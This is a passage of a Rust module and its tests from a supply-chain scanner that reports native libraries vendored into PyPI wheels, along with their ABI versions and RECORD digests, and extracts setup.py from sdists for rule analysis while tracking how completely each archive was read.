//! Read a PyPI distribution's own bytes and report what is actually in it.
//!
//! Two things a wheel or sdist contains that its metadata never mentions:
//!
//! 1. **Vendored native libraries.** `auditwheel` (Linux), `delocate` (macOS)
//!    and `delvewheel` (Windows) are the standard repair tools in every
//!    binary-wheel build pipeline. They copy the native shared libraries a C
//!    extension links against *into* the wheel — `auditwheel`/`delvewheel`
//!    into a top-level `<distname>.libs/`, `delocate` into a `.dylibs/` beside
//!    the package — and rewrite the SONAME/install-name so the extension loads
//!    the copy. A wheel for an imaging or numeric library therefore physically
//!    ships libwebp, libjpeg-turbo, zlib, OpenBLAS. Nothing in `METADATA`,
//!    `RECORD` or `WHEEL` names any of them, so a scanner reading only the
//!    Python metadata reports the wheel as clean while a known-vulnerable
//!    libwebp sits inside it. This is the same defect conda has (#4033), with
//!    a much larger audience.
//!
//! 2. **`setup.py` in an sdist.** `pip install <sdist>` executes it to learn
//!    what the package even is. That is the same position in the threat model
//!    as a conda `post-link` hook or an npm `postinstall`, so it goes through
//!    the same rule engine ([`conda_scripts::analyze_script`]) as
//!    [`ScriptKind::PythonSetupPy`].
//!
//! # Honesty contract
//!
//! Every entry point returns a [`Completeness`] alongside its findings, and it
//! is derived from *what the reader managed to do*, never from whether the
//! findings happen to be empty. A wheel we could not open records
//! [`Completeness::NotRead`]; a wheel we walked end to end that genuinely has
//! no vendored libraries records [`Completeness::Complete`] with an empty list.
//! Those two must never render alike — an unread archive showing as "clean" is
//! the precise defect this work exists to remove.
//!
//! # Versions
//!
//! See [`parse_vendored_library_name`]. The short version: the numbers in a
//! repaired library's filename are almost always an ELF/libtool **ABI**
//! version, not the upstream release, so this module refuses to publish them
//! as `version`. A wrong version silently matches the wrong CVEs, which is
//! worse than no version at all.

use std::io::{Read, Seek};

use once_cell::sync::Lazy;
use regex::Regex;

use crate::services::conda_recipe::SourceConfidence;
use crate::services::conda_scripts::{make_inline_script, InstallScript, ScriptKind};
use crate::services::package_analysis_service::{
    Completeness, ExtractedComponent, UnanalyzedScript,
};
use crate::util::bounded_archive::{
    read_capped, read_metadata_from_tar_gz, read_metadata_from_zip, MAX_INGEST_ARCHIVE_ENTRIES,
    MAX_INGEST_METADATA_ENTRY_BYTES,
};

/// Which repair tool put a library in the wheel, inferred from the library's
/// file extension rather than the directory name: `auditwheel` and
/// `delvewheel` both use `<distname>.libs/`, and only the payload tells them
/// apart.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum VendoringTool {
    /// Linux, `<distname>.libs/libfoo-<hash>.so.N.N.N`.
    AuditWheel,
    /// macOS, `<pkg>/.dylibs/libfoo-<hash>.N.dylib`.
    Delocate,
    /// Windows, `<distname>.libs/foo-<hash>.dll`.
    DelvEWheel,
}

impl VendoringTool {
    /// Stable lowercase wire form, used in `detection_method`.
    pub fn as_str(self) -> &'static str {
        match self {
            VendoringTool::AuditWheel => "auditwheel",
            VendoringTool::Delocate => "delocate",
            VendoringTool::DelvEWheel => "delvewheel",
        }
    }
}

/// A native shared library found inside a wheel.
///
/// Shaped to line up 1:1 with the `package_vendored_components` columns so the
/// integration in [`crate::services::package_analysis_service`] is a field
/// copy and nothing has to be re-derived at the insert site.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VendoredLibrary {
    /// Library name with the repair tool's hash suffix removed — `libwebp`,
    /// `libopenblas`. The `lib` prefix is deliberately kept: stripping it
    /// would turn `libjpeg` into `jpeg`, which matches less, not more.
    pub name: String,
    /// Upstream release version, or `None` when it could not be established
    /// confidently. `None` is the overwhelmingly common case; see
    /// [`parse_vendored_library_name`].
    pub version: Option<String>,
    /// `pkg:generic/<name>@<version>`, and only ever populated when `version`
    /// is — a purl with no version is not a useful match key.
    pub purl: Option<String>,
    /// Content digest of the library, taken from the wheel's own `RECORD`
    /// rather than by inflating the `.so`, which would cost tens of MB.
    /// `None` when `RECORD` was absent, unreadable, or did not list the file.
    pub sha256: Option<String>,
    pub confidence: SourceConfidence,
    /// `wheel:<tool>:<path inside the wheel>` — e.g.
    /// `wheel:auditwheel:Pillow.libs/libjpeg-e44fd0cd.so.62.3.0`.
    ///
    /// Mirrors conda's `recipe:<file>`: the method, plus where the evidence
    /// came from. The path is the *mangled* name as the zip stores it, which
    /// is what a reviewer greps an unzip listing for; the de-mangled name
    /// lives in `soname`, which has its own column and must not be duplicated
    /// here.
    pub detection_method: String,
    /// Path inside the wheel, as the zip names it.
    pub path: String,
    /// The filename with the hash suffix removed — i.e. what the library was
    /// called before the repair tool mangled it, which for ELF is its SONAME.
    pub soname: String,
    /// The trailing ABI numbers (`62.3.0` from `libjpeg.so.62.3.0`). Recorded
    /// separately and never promoted into `version`: libtool's
    /// `current.revision.age` triple has no fixed relationship to the upstream
    /// release number.
    pub abi_version: Option<String>,
}

impl VendoredLibrary {
    /// Hand this library to [`record_analysis`] as a component.
    ///
    /// The fields with no analogue here stay `None`: a vendored `.so` has no
    /// source URL, no git coordinates and no applied patches, and inventing
    /// any of them would put a guess in a column a reader takes as fact.
    ///
    /// [`record_analysis`]: crate::services::package_analysis_service::record_analysis
    pub fn to_extracted(&self) -> ExtractedComponent {
        ExtractedComponent {
            name: self.name.clone(),
            version: self.version.clone(),
            purl: self.purl.clone(),
            source_url: None,
            git_url: None,
            git_rev: None,
            sha256: self.sha256.clone(),
            applied_patches: Vec::new(),
            confidence: self.confidence.clone(),
            detection_method: self.detection_method.clone(),
            soname: Some(self.soname.clone()),
            abi_version: self.abi_version.clone(),
        }
    }
}

/// What [`parse_vendored_library_name`] recovers from one filename.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedLibraryName {
    pub name: String,
    pub version: Option<String>,
    pub abi_version: Option<String>,
    pub soname: String,
    pub tool: VendoringTool,
    /// True when a repair-tool hash suffix was recognised and removed. False
    /// means the filename was taken as-is — either the wheel was hand-built or
    /// the tool did not mangle this particular name.
    pub hash_stripped: bool,
}

impl ParsedLibraryName {
    /// `pkg:generic/<name>@<version>`, or `None` when there is no version. A
    /// purl without a version is not a match key — it would widen to every
    /// release of the library — so one is never minted.
    pub fn purl_ready(&self) -> Option<String> {
        self.version
            .as_ref()
            .map(|v| format!("pkg:generic/{}@{}", self.name, v))
    }
}

/// Everything one distribution yielded, ready for `record_analysis`.
#[derive(Debug, Clone)]
pub struct PypiAnalysis {
    pub components: Vec<VendoredLibrary>,
    pub inline_scripts: Vec<InstallScript>,
    /// Scripts we extracted but deliberately did not run rules over, each
    /// carrying its reason. Stored with `findings = NULL`, which is a
    /// different fact from `findings = []`.
    pub unanalyzed_scripts: Vec<UnanalyzedScript>,
    pub completeness: Completeness,
}

impl PypiAnalysis {
    fn empty(completeness: Completeness) -> Self {
        PypiAnalysis {
            components: Vec::new(),
            inline_scripts: Vec::new(),
            unanalyzed_scripts: Vec::new(),
            completeness,
        }
    }

    /// Nothing was read, and the result says so. The constructor callers reach
    /// for when the archive never got as far as this module — a scratch file
    /// that would not re-open, a decode slot shed under load — so those paths
    /// cannot accidentally record an empty-and-`Complete` analysis.
    pub fn not_read(reason: impl Into<String>) -> Self {
        Self::empty(Completeness::NotRead {
            reason: reason.into(),
        })
    }
}

// ---------------------------------------------------------------------------
// Filename parsing
// ---------------------------------------------------------------------------

// `libjpeg.so`, `libjpeg.so.62`, `libjpeg.so.62.3.0`. The stem is lazy so the
// ABI tail is taken from the LAST `.so`, which is what lets `libpython3.11.so`
// keep its dotted stem instead of being cut at `libpython3`.
static RE_ELF: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^(?P<stem>.+?)\.so(?P<abi>(?:\.\d+)*)$").expect("valid regex"));

// `libjpeg.dylib`, `libjpeg.62.dylib`, `libjpeg.62.3.0.dylib`.
static RE_MACHO: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^(?P<stem>.+?)(?P<abi>(?:\.\d+)*)\.dylib$").expect("valid regex"));

static RE_PE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)^(?P<stem>.+?)\.dll$").expect("valid regex"));

// The repair tools insert a truncated content hash as the last dash-separated
// token of the stem. `auditwheel` and `delocate` use 8 lowercase hex chars;
// `delvewheel` uses 32. At least one `a-f` is required so a token that is all
// digits — `libfoo-20240115.so`, a datestamped build — is left alone: an
// all-decimal 8-character token is a plausible real name part and stripping it
// would invent a library that does not exist.
static RE_HASH_SUFFIX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^(?P<base>.+)-(?P<hash>(?:[0-9a-f]{8}|[0-9a-f]{32}))$").expect("valid regex")
});

// A dotted release version sitting in the stem itself: `libopenblas-0.3.21`.
// At least one dot is required, which is what keeps `-20240115` out.
static RE_STEM_VERSION: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^(?P<base>.+?)-(?P<ver>\d+(?:\.\d+)+)$").expect("valid regex"));

fn looks_like_hash(token: &str) -> bool {
    token.chars().any(|c| c.is_ascii_alphabetic())
}

/// Split a repaired library's filename into name, ABI tail and — rarely — a
/// release version. Returns `None` for anything that is not a shared library.
///
/// ## Why `version` is almost always `None`
///
/// The numbers in these filenames are ELF/libtool ABI versions. `libwebp.so.7`
/// ships in libwebp *1.2.4*; `libjpeg.so.62.3.0` ships in libjpeg-turbo
/// *2.1.4*. Publishing `7` or `62.3.0` as the component version would hand a
/// CVE matcher a number that belongs to a different numbering scheme
/// altogether, and it would match confidently and wrongly.
///
/// So the ABI tail goes to `abi_version` and never to `version`. A version is
/// emitted only when the stem carries a dotted release number of its own
/// (`libopenblas-0.3.21.so`), which is a minority of real wheels. Everything
/// else is reported with `version: None` and [`SourceConfidence::Unresolved`].
pub fn parse_vendored_library_name(file_name: &str) -> Option<ParsedLibraryName> {
    let (stem, abi, ext, tool) = if let Some(c) = RE_ELF.captures(file_name) {
        (
            c["stem"].to_string(),
            c["abi"].to_string(),
            ".so".to_string(),
            VendoringTool::AuditWheel,
        )
    } else if let Some(c) = RE_MACHO.captures(file_name) {
        (
            c["stem"].to_string(),
            c["abi"].to_string(),
            ".dylib".to_string(),
            VendoringTool::Delocate,
        )
    } else {
        // Not a `.so` or `.dylib`, so a `.dll` or nothing at all. The
        // extension is sliced off the original rather than hardcoded, because
        // `.DLL` occurs in real wheels and must round-trip into the SONAME
        // with the case it was published under.
        let c = RE_PE.captures(file_name)?;
        (
            c["stem"].to_string(),
            String::new(),
            file_name[c["stem"].len()..].to_string(),
            VendoringTool::DelvEWheel,
        )
    };

    if stem.is_empty() {
        return None;
    }

    let (name, hash_stripped) = match RE_HASH_SUFFIX.captures(&stem) {
        Some(c) if looks_like_hash(&c["hash"]) => (c["base"].to_string(), true),
        _ => (stem.clone(), false),
    };

    // `soname` is the filename as it was before the tool mangled it: the name
    // with the hash removed, the ABI tail and extension put back in place. For
    // ELF that is literally the SONAME the linker records.
    let soname = match tool {
        VendoringTool::Delocate => format!("{name}{abi}{ext}"),
        _ => format!("{name}{ext}{abi}"),
    };

    let (name, version) = match RE_STEM_VERSION.captures(&name) {
        Some(c) => (c["base"].to_string(), Some(c["ver"].to_string())),
        None => (name.clone(), None),
    };

    Some(ParsedLibraryName {
        name,
        version,
        abi_version: abi.strip_prefix('.').map(|s| s.to_string()),
        soname,
        tool,
        hash_stripped,
    })
}

/// True when `path` lands inside a repair tool's vendored-library directory.
///
/// `auditwheel`/`delvewheel` create a top-level `<distname>.libs/`;
/// `delocate` creates `<pkg>/.dylibs/`, nested beside the extension modules.
/// Matching on any component keeps both, and namespace packages that push the
/// `.dylibs` a level deeper.
pub fn is_vendored_lib_path(path: &str) -> bool {
    path.split('/')
        .rev()
        .skip(1) // the filename itself is not a directory
        .any(|c| c == ".dylibs" || c.ends_with(".libs"))
}

// ---------------------------------------------------------------------------
// RECORD
// ---------------------------------------------------------------------------

/// Parse a wheel `RECORD` into `(path, sha256-hex)` pairs.
///
/// Lines are `path,sha256=<urlsafe-base64-unpadded>,size`. The hash field is
/// empty for `RECORD` itself and may use another algorithm on old wheels;
/// anything that is not a well-formed `sha256=` field is skipped rather than
/// guessed at.
fn parse_record_hashes(record: &str) -> std::collections::HashMap<String, String> {
    use base64::Engine as _;
    let engine = base64::engine::general_purpose::URL_SAFE_NO_PAD;

    let mut out = std::collections::HashMap::new();
    for line in record.lines() {
        // The path may be quoted and contain commas, so split from the right:
        // the last two fields are size and hash.
        let mut parts = line.rsplitn(3, ',');
        let Some(_size) = parts.next() else { continue };
        let Some(hash_field) = parts.next() else {
            continue;
        };
        let Some(path) = parts.next() else { continue };
        let Some(b64) = hash_field.strip_prefix("sha256=") else {
            continue;
        };
        let Ok(raw) = engine.decode(b64) else {
            continue;
        };
        if raw.len() != 32 {
            continue;
        }
        out.insert(path.trim_matches('"').to_string(), hex::encode(raw));
    }
    out
}

// ---------------------------------------------------------------------------
// Wheels
// ---------------------------------------------------------------------------

/// Walk a wheel and report the native libraries a repair tool vendored into it.
///
/// Bounded by the shared ingestion caps: the entry-count ceiling is checked up
/// front from the central directory, and `RECORD` is read through the
/// per-entry cap. The `.so`/`.dylib`/`.dll` payloads are never inflated — only
/// their names are needed, and their digests come from `RECORD` — so a wheel
/// full of 40 MB shared objects costs a directory walk and one small text
/// file.
pub fn analyze_wheel<R: Read + Seek>(reader: R) -> PypiAnalysis {
    analyze_wheel_limited(
        reader,
        MAX_INGEST_ARCHIVE_ENTRIES,
        MAX_INGEST_METADATA_ENTRY_BYTES,
    )
}

/// `_limited` seam for [`analyze_wheel`], matching the convention in
/// [`crate::util::bounded_archive`]: it lets a test drive a tiny cap against a
/// tiny fixture instead of building an 8 MiB `RECORD` to prove the cap-breach
/// path behaves.
pub fn analyze_wheel_limited<R: Read + Seek>(
    reader: R,
    max_entries: u64,
    max_entry: u64,
) -> PypiAnalysis {
    let mut archive = match zip::ZipArchive::new(reader) {
        Ok(a) => a,
        Err(e) => {
            return PypiAnalysis::empty(Completeness::NotRead {
                reason: format!("Wheel could not be opened as a ZIP archive: {e}"),
            })
        }
    };

    if archive.len() as u64 > max_entries {
        return PypiAnalysis::empty(Completeness::NotRead {
            reason: format!(
                "Wheel contains too many entries (> {max_entries}); \
                 refusing suspected decompression bomb"
            ),
        });
    }

    let total = archive.len();
    let mut names: Vec<String> = Vec::with_capacity(total);
    let mut record_index: Option<usize> = None;
    let mut unreadable = 0usize;

    for i in 0..total {
        let entry = match archive.by_index(i) {
            Ok(f) => f,
            Err(_) => {
                unreadable += 1;
                continue;
            }
        };
        if !entry.is_file() {
            continue;
        }
        let name = entry.name().to_string();
        if name.ends_with(".dist-info/RECORD") {
            record_index = Some(i);
        }
        names.push(name);
    }

    let mut components: Vec<VendoredLibrary> = Vec::new();
    for path in &names {
        if !is_vendored_lib_path(path) {
            continue;
        }
        let Some(file_name) = path.rsplit('/').next() else {
            continue;
        };
        let Some(parsed) = parse_vendored_library_name(file_name) else {
            // A `.load-order-*` sidecar or a licence file sitting in the same
            // directory: present, but not a library.
            continue;
        };
        components.push(VendoredLibrary {
            purl: parsed.purl_ready(),
            confidence: if parsed.version.is_some() {
                SourceConfidence::Inferred
            } else {
                SourceConfidence::Unresolved
            },
            detection_method: format!("wheel:{}:{}", parsed.tool.as_str(), path),
            name: parsed.name,
            version: parsed.version,
            sha256: None,
            path: path.clone(),
            soname: parsed.soname,
            abi_version: parsed.abi_version,
        });
    }

    // Digests, from RECORD. Only worth reading when there is something to
    // attach them to.
    //
    // A missing digest does NOT weaken the package-level claim. `Completeness`
    // answers "how much of the archive did we read"; the component list being
    // whole is exactly the case where "we could not read some of it" is false.
    // The missing evidence is already machine-readable as `sha256: None` on
    // the rows, so a caller can say "3 components, no digests" from the rows
    // themselves. Spending `Partial` on it would blur the one thing `Partial`
    // means, and a word that means two things is no use to a reviewer.
    //
    // The exception is [`RecordFailure::Unread`]: bytes that are present in
    // the archive and that we declined to read. That IS a partial read, and it
    // is the same fact as an unreadable entry above.
    let mut record_unread: Option<String> = None;
    if !components.is_empty() {
        match record_index {
            // PEP 427 requires RECORD, so its absence means a malformed wheel
            // — but we walked the whole archive to establish that. A complete
            // read of a malformed wheel is still a complete read.
            None => {}
            Some(i) => match read_record(&mut archive, i, max_entry) {
                Ok(text) => {
                    let hashes = parse_record_hashes(&text);
                    for c in components.iter_mut() {
                        c.sha256 = hashes.get(&c.path).cloned();
                    }
                }
                Err(RecordFailure::Unread(why)) => record_unread = Some(why),
                // Read in full, not usable. Malformed, not unread; the rows
                // carry `sha256: None` and say so on their own.
                Err(RecordFailure::Unusable(why)) => {
                    tracing::info!(why = %why, "wheel RECORD could not be parsed for digests");
                }
            },
        }
    }

    dedupe_components(&mut components);

    let completeness = if unreadable > 0 {
        Completeness::Partial {
            reason: format!("{unreadable} wheel entries could not be read"),
            files_read: (total - unreadable) as i32,
            files_total: total as i32,
        }
    } else if let Some(why) = record_unread {
        Completeness::Partial {
            reason: format!("The wheel's RECORD is present but was not read: {why}"),
            files_read: total.saturating_sub(1) as i32,
            files_total: total as i32,
        }
    } else {
        Completeness::Complete
    };

    PypiAnalysis {
        components,
        inline_scripts: Vec::new(),
        unanalyzed_scripts: Vec::new(),
        completeness,
    }
}

/// Why `RECORD` yielded no digests. The two variants are a different fact
/// about the archive, and only one of them is a partial read.
#[derive(Debug, Clone, PartialEq, Eq)]
enum RecordFailure {
    /// The bytes are in the archive and we did not read them — a cap refused
    /// the entry, or the entry would not open. A partial read.
    Unread(String),
    /// The bytes were read in full but are not usable as a `RECORD`. The read
    /// was complete; the file is malformed.
    Unusable(String),
}

fn read_record<R: Read + Seek>(
    archive: &mut zip::ZipArchive<R>,
    index: usize,
    max_entry: u64,
) -> Result<String, RecordFailure> {
    let mut entry = archive
        .by_index(index)
        .map_err(|e| RecordFailure::Unread(format!("it could not be opened: {e}")))?;
    if entry.size() > max_entry {
        return Err(RecordFailure::Unread(format!(
            "it exceeds the maximum allowed entry size of {max_entry} bytes"
        )));
    }
    let bytes = read_capped(&mut entry, max_entry, "wheel RECORD")
        .map_err(|e| RecordFailure::Unread(e.to_string()))?;
    String::from_utf8(bytes)
        .map_err(|_| RecordFailure::Unusable("RECORD is not valid UTF-8".to_string()))
}

/// Two entries naming the same library at the same version are one finding.
/// Sorting also pins the row order, so re-analyzing an artifact produces an
/// identical set of rows rather than a reshuffled one.
fn dedupe_components(components: &mut Vec<VendoredLibrary>) {
    components.sort_by(|a, b| {
        a.name
            .cmp(&b.name)
            .then_with(|| a.version.cmp(&b.version))
            .then_with(|| a.path.cmp(&b.path))
    });
    components.dedup_by(|a, b| a.name == b.name && a.version == b.version);
}

// ---------------------------------------------------------------------------
// Source distributions
// ---------------------------------------------------------------------------

/// True for `<root>/setup.py` — the one `pip` executes.
///
/// Depth is checked so a `setup.py` under `tests/fixtures/` (packages ship
/// these) is not mistaken for the real one and reported as executing at
/// install time when it does not.
fn is_sdist_setup_py(path: &str) -> bool {
    let parts: Vec<&str> = path
        .trim_start_matches("./")
        .split('/')
        .filter(|p| !p.is_empty())
        .collect();
    parts.len() == 2 && parts[1] == "setup.py"
}

fn setup_py_analysis(bytes: Option<Vec<u8>>) -> PypiAnalysis {
    let Some(bytes) = bytes else {
        // Walked the whole archive, found no `setup.py`. A PEP 517
        // `pyproject.toml`-only sdist is the modern normal, and it is a real
        // finding in its own right: nothing arbitrary runs at metadata time.
        return PypiAnalysis::empty(Completeness::Complete);
    };
    let body = match std::str::from_utf8(&bytes) {
        Ok(s) => s.to_owned(),
        Err(_) => {
            // The file exists and `pip` will still execute it; we just cannot
            // read it as text. Dropping it would hide a script that runs, and
            // running shell/Python rules over a mangled decode would invent
            // matches — so it is recorded as extracted-but-not-analysed, with
            // `findings = NULL` and the reason travelling with the row.
            return PypiAnalysis {
                unanalyzed_scripts: vec![UnanalyzedScript {
                    script: non_utf8_setup_py(&bytes),
                    // The real byte count, so nothing downstream derives one
                    // from the lossy body.
                    original_size_bytes: bytes.len() as i64,
                    reason: "setup.py is not valid UTF-8. The body shown is a lossy decode, \
                             so no rules were run over it; the sha256 is of the original bytes."
                        .to_string(),
                }],
                // The archive itself was read end to end. How much we READ and
                // what we were able to ANALYSE are different facts, and the
                // NULL findings carry the second one.
                ..PypiAnalysis::empty(Completeness::Complete)
            };
        }
    };
    PypiAnalysis {
        inline_scripts: vec![make_inline_script(
            ScriptKind::PythonSetupPy,
            "setup.py",
            &body,
        )],
        ..PypiAnalysis::empty(Completeness::Complete)
    }
}

/// An [`InstallScript`] for a `setup.py` that is not valid UTF-8.
///
/// Deliberately not [`make_inline_script`]: that hashes the body it is given,
/// which for a lossy decode would store the digest of text that is not what is
/// in the archive. A reader who runs `sha256sum setup.py` must get the value
/// in this row back, so the digest is taken over the ORIGINAL bytes and only
/// the displayed body is lossy.
fn non_utf8_setup_py(bytes: &[u8]) -> InstallScript {
    InstallScript {
        kind: ScriptKind::PythonSetupPy,
        path: "setup.py".to_string(),
        sha256: hex::encode(<sha2::Sha256 as sha2::Digest>::digest(bytes)),
        body: String::from_utf8_lossy(bytes).into_owned(),
    }
}

/// Extract and analyze `setup.py` from a `.tar.gz` sdist.
pub fn analyze_sdist_tar_gz<R: Read>(reader: R) -> PypiAnalysis {
    match read_metadata_from_tar_gz(reader, |p| is_sdist_setup_py(&p.to_string_lossy())) {
        Ok(found) => setup_py_analysis(found),
        Err(e) => PypiAnalysis::empty(Completeness::NotRead {
            reason: format!("Source distribution could not be read: {e}"),
        }),
    }
}

/// Extract and analyze `setup.py` from a `.zip` sdist.
pub fn analyze_sdist_zip<R: Read + Seek>(reader: R) -> PypiAnalysis {
    match read_metadata_from_zip(reader, is_sdist_setup_py) {
        Ok(found) => setup_py_analysis(found),
        Err(e) => PypiAnalysis::empty(Completeness::NotRead {
            reason: format!("Source distribution could not be read: {e}"),
        }),
    }
}

/// Dispatch on the distribution filename.
///
/// An extension with no analyzer records [`Completeness::Unsupported`] rather
/// than nothing at all, so `.egg` and `.tar.bz2` uploads stay distinguishable
/// from ones we read and found clean.
pub fn analyze_distribution<R: Read + Seek>(filename: &str, reader: R) -> PypiAnalysis {
    let lower = filename.to_ascii_lowercase();
    if lower.ends_with(".whl") {
        analyze_wheel(reader)
    } else if lower.ends_with(".tar.gz") || lower.ends_with(".tgz") {
        analyze_sdist_tar_gz(reader)
    } else if lower.ends_with(".zip") {
        analyze_sdist_zip(reader)
    } else {
        PypiAnalysis::empty(Completeness::Unsupported {
            reason: format!("No package-content analyzer for this distribution type: {filename}"),
        })
    }
}

#[cfg(ak_test_shard = "services-1")]
#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Cursor, Write};

    // -- fixtures ----------------------------------------------------------
    //
    // Wheels and sdists are built in-test rather than checked in: a binary
    // fixture cannot be reviewed in a diff, and the shape under test here is
    // entirely a matter of file names.

    fn wheel(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut buf = Cursor::new(Vec::new());
        {
            let mut zw = zip::ZipWriter::new(&mut buf);
            let opts: zip::write::FileOptions<'_, ()> = zip::write::FileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            for (name, data) in entries {
                zw.start_file(*name, opts).unwrap();
                zw.write_all(data).unwrap();
            }
            zw.finish().unwrap();
        }
        buf.into_inner()
    }

    fn record_line(path: &str, data: &[u8]) -> String {
        use base64::Engine as _;
        let digest = <sha2::Sha256 as sha2::Digest>::digest(data);
        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(digest);
        format!("{path},sha256={b64},{}\n", data.len())
    }

    fn tar_gz(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(flate2::write::GzEncoder::new(
            Vec::new(),
            flate2::Compression::default(),
        ));
        for (name, data) in entries {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append_data(&mut header, name, *data).unwrap();
        }
        builder.into_inner().unwrap().finish().unwrap()
    }

    fn status(c: &Completeness) -> &'static str {
        match c {
            Completeness::Complete => "complete",
            Completeness::Partial { .. } => "partial",
            Completeness::NotRead { .. } => "not_read",
            Completeness::Unsupported { .. } => "unsupported",
        }
    }

    // -- filename parsing --------------------------------------------------

    #[test]
    fn pypi_strips_an_auditwheel_hash_suffix() {
        let p = parse_vendored_library_name("libwebp-850e2bec.so.7.1.3").unwrap();
        assert_eq!(p.name, "libwebp");
        assert!(p.hash_stripped);
        assert_eq!(p.abi_version.as_deref(), Some("7.1.3"));
        assert_eq!(p.soname, "libwebp.so.7.1.3");
        assert_eq!(p.tool, VendoringTool::AuditWheel);
    }

    #[test]
    fn pypi_never_promotes_an_abi_tail_to_a_version() {
        // libwebp.so.7 ships in libwebp 1.2.4 and libjpeg.so.62.3.0 in
        // libjpeg-turbo 2.1.4. Reporting 7 or 62.3.0 as the version would hand
        // a CVE matcher a number from an unrelated numbering scheme.
        for name in [
            "libwebp-850e2bec.so.7",
            "libwebp-850e2bec.so.7.1.3",
            "libjpeg-e44fd0cd.so.62.3.0",
            "libtiff-91af027d.5.dylib",
        ] {
            let p = parse_vendored_library_name(name).unwrap();
            assert_eq!(p.version, None, "{name} must not yield a version");
            assert!(p.abi_version.is_some(), "{name} must record its ABI tail");
        }
    }

    #[test]
    fn pypi_parses_a_delocate_dylib_name() {
        let p = parse_vendored_library_name("libjpeg-e44fd0cd.62.3.0.dylib").unwrap();
        assert_eq!(p.name, "libjpeg");
        assert_eq!(p.abi_version.as_deref(), Some("62.3.0"));
        assert_eq!(p.soname, "libjpeg.62.3.0.dylib");
        assert_eq!(p.tool, VendoringTool::Delocate);
    }

    #[test]
    fn pypi_parses_a_delvewheel_dll_name() {
        let p =
            parse_vendored_library_name("libwebp-bd1a12ff56ba4c1a5f9b6ee1e0c22bb0.dll").unwrap();
        assert_eq!(p.name, "libwebp");
        assert!(p.hash_stripped);
        assert_eq!(p.version, None, "a DLL name carries no release version");
        assert_eq!(p.soname, "libwebp.dll");
        assert_eq!(p.tool, VendoringTool::DelvEWheel);
    }

    #[test]
    fn pypi_leaves_alone_names_that_only_look_like_a_hash_suffix() {
        // Each of these has a trailing dash token that a naive strip would
        // eat, inventing a library that is not in the wheel.
        let cases = [
            // all-decimal: a datestamped build, not a hash. 8 hex digits that
            // happen to contain no a-f is ~2% of real hashes, so this rule
            // trades a rare missed strip for never inventing a library.
            ("libfoo-20240115.so", "libfoo-20240115"),
            // too short to be either tool's hash, and the trailing number is
            // part of the canonical name (`libgcc_s-1.dll` IS the library).
            ("libgcc_s-1.dll", "libgcc_s-1"),
            ("libssl-3.so", "libssl-3"),
            // no dash at all, even though the stem is pure hex
            ("libdeadbeef.so", "libdeadbeef"),
            // 9 chars, and not hex anyway
            ("libz-ngversion.so", "libz-ngversion"),
        ];
        for (input, expected) in cases {
            let p = parse_vendored_library_name(input).unwrap();
            assert_eq!(p.name, expected, "{input}");
            assert!(!p.hash_stripped, "{input} must not be treated as mangled");
        }

        // A dotted token is a version, not a hash: it must fall through to the
        // version rule rather than being eaten as a suffix.
        let p = parse_vendored_library_name("libcrypto-1.1.1.so").unwrap();
        assert!(!p.hash_stripped);
        assert_eq!(p.name, "libcrypto");
        assert_eq!(p.version.as_deref(), Some("1.1.1"));
    }

    #[test]
    fn pypi_recovers_a_release_version_only_from_the_stem() {
        // The repair tool appends its hash last, so it is stripped first; the
        // dotted number left in front of it is a genuine release version.
        let p = parse_vendored_library_name("libopenblas-0.3.21-15028c96.so").unwrap();
        assert_eq!(p.name, "libopenblas");
        assert_eq!(p.version.as_deref(), Some("0.3.21"));
        assert!(p.hash_stripped);
        assert_eq!(p.soname, "libopenblas-0.3.21.so");
        assert_eq!(
            p.purl_ready(),
            Some("pkg:generic/libopenblas@0.3.21".to_string())
        );
    }

    #[test]
    fn pypi_keeps_a_dotted_stem_out_of_the_abi_tail() {
        let p = parse_vendored_library_name("libpython3.11.so.1.0").unwrap();
        assert_eq!(p.name, "libpython3.11");
        assert_eq!(p.abi_version.as_deref(), Some("1.0"));
    }

    #[test]
    fn pypi_rejects_non_library_filenames() {
        for name in [
            ".load-order-pillow-10.0.0",
            "LICENSE.txt",
            "__init__.py",
            "libfoo.so.extra",
        ] {
            assert!(
                parse_vendored_library_name(name).is_none(),
                "{name} is not a shared library"
            );
        }
    }

    #[test]
    fn pypi_vendored_dir_detection_covers_both_layouts() {
        assert!(is_vendored_lib_path("Pillow.libs/libwebp-850e2bec.so.7"));
        assert!(is_vendored_lib_path(
            "PIL/.dylibs/libjpeg-e44fd0cd.62.dylib"
        ));
        assert!(is_vendored_lib_path("a/b/numpy.libs/libopenblas.so"));
        assert!(!is_vendored_lib_path("PIL/_imaging.so"));
        assert!(!is_vendored_lib_path("Pillow.libs"));
        assert!(!is_vendored_lib_path("mylibs/libfoo.so"));
    }

    // -- wheels ------------------------------------------------------------

    #[test]
    fn pypi_wheel_reports_auditwheel_vendored_libraries() {
        let webp: &[u8] = b"\x7fELF fake webp";
        let jpeg: &[u8] = b"\x7fELF fake jpeg";
        let record = format!(
            "{}{}{}",
            record_line("Pillow.libs/libwebp-850e2bec.so.7.1.3", webp),
            record_line("Pillow.libs/libjpeg-e44fd0cd.so.62.3.0", jpeg),
            "Pillow-10.0.0.dist-info/RECORD,,\n"
        );
        let w = wheel(&[
            ("PIL/__init__.py", b"" as &[u8]),
            ("Pillow.libs/libwebp-850e2bec.so.7.1.3", webp),
            ("Pillow.libs/libjpeg-e44fd0cd.so.62.3.0", jpeg),
            ("Pillow.libs/.load-order-pillow-10.0.0", b"libwebp\n"),
            ("Pillow-10.0.0.dist-info/RECORD", record.as_bytes()),
        ]);

        let a = analyze_wheel(Cursor::new(w));
        assert_eq!(status(&a.completeness), "complete");
        let names: Vec<&str> = a.components.iter().map(|c| c.name.as_str()).collect();
        assert_eq!(names, vec!["libjpeg", "libwebp"]);
